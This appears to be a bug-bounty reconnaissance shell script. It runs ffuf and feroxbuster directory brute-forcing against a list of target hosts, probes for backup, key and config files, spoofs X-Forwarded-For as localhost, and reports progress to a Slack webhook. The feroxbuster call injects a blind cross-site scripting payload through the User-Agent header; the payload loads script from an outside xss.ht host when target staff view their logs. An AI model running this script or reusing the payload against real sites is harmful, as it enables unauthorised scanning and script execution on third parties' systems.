#!/bin/sh

TARGET=$1
title=ffuf2
mkdir -pv "${TARGET}/${title}"
LOGFILE=backuplog
dir=$(pwd)


curl -X POST -H 'Content-type: application/json' --data '{"text":"[+]ffuf Started '$1'"}' https://hooks.slack.com/services/T01AQE9LR4Y/B01EVSURW2D/<token>
echo "[+] ffuf SCanning started ....."
for URI in `cat "$1"/httprobe_"$1".txt`
do
    name="$(echo "$URI" | cut -d"/" -f3)"
    ffuf -mc all -c -H "X-Forwarded-For: 127.0.0.1" -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0" -u "$URI/FUZZ" -w $dir/wordlist/dicc.txt -D -e js,php,bak,txt,asp,aspx,jsp,html,zip,jar,sql,json,old,gz,shtml,log,swp,yaml,yml,config,save,rsa,ppk -ac -fc '404,429,501,502,503,400' -s -o ./$1/${title}/ffuf2_$name.json

	 cat ./$1/${title}/ffuf2_${name}.json | jq '[.results[]|{status: .status, length: .length, url: .url}]' | grep -oP "status\":\s(\d{3})|length\":\s(\d{1,7})|url\":\s\"(http[s]?:\/\/.*?)\"" | paste -d' '   - - - | awk '{print $2" "$4" "$6}' | sed 's/\"//g' >> ./$1/${title}/all_result.txt
done
curl -X POST -H 'Content-type: application/json' --data '{"text":"[!] ffuf Completed '$1'"}' https://hooks.slack.com/services/T01AQE9LR4Y/B01EVSURW2D/<token>

curl -X POST -H 'Content-type: application/json' --data '{"text":"[+] Feroxide Scan Started '$1'"}' https://hooks.slack.com/services/T01AQE9LR4Y/B01EVSURW2D/<token>
echo "[+] started with Feroxide"
cat $1/httprobe_$1.txt | feroxbuster --stdin -w $dir/wordlist/dicc.txt -H 'User-Agent: <script src=https://Tanmay95.xss.ht></script>' -d 1 -t 20 -o ./$1/${title}/feroxbuster.txt
echo "[*] Done.."
cat ./$1/${title}/all_result.txt  ./$1/${title}/feroxbuster.txt >> ./$1/${title}/all_feroandffuf.txt

echo "${magenta} [+] Sorting According to Status Codes ${reset}"
cat ./$1/${title}/all_feroandffuf.txt | grep 200 > ./$1/${title}/all_feroandffuf_200.txt
cat ./$1/${title}/all_feroandffuf.txt | grep 204 > ./$1/${title}/all_feroandffuf_204.txt
cat ./$1/${title}/all_feroandffuf.txt | grep 301 > ./$1/${title}/all_feroandffuf_301.txt
cat ./$1/${title}/all_feroandffuf.txt | grep 302 > ./$1/${title}/all_feroandffuf_302.txt
cat ./$1/${title}/all_feroandffuf.txt | grep 307 > ./$1/${title}/all_feroandffuf_307.txt
cat ./$1/${title}/all_feroandffuf.txt | grep 308 > ./$1/${title}/all_feroandffuf_308.txt
cat ./$1/${title}/all_feroandffuf.txt | grep 401 > ./$1/${title}/all_feroandffuf_401.txt
cat ./$1/${title}/all_feroandffuf.txt | grep 403 > ./$1/${title}/all_feroandffuf_403.txt
cat ./$1/${title}/all_feroandffuf.txt | grep 405 > ./$1/${title}/all_feroandffuf_405.txt
echo " "
echo "${blue} [+] Succesfully saved according to status codes ${reset}"
echo " "

curl -X POST -H 'Content-type: application/json' --data '{"text":"[!] Feroxide Completed '$1'"}' https://hooks.slack.com/services/T01AQE9LR4Y/B01EVSURW2D/<token>
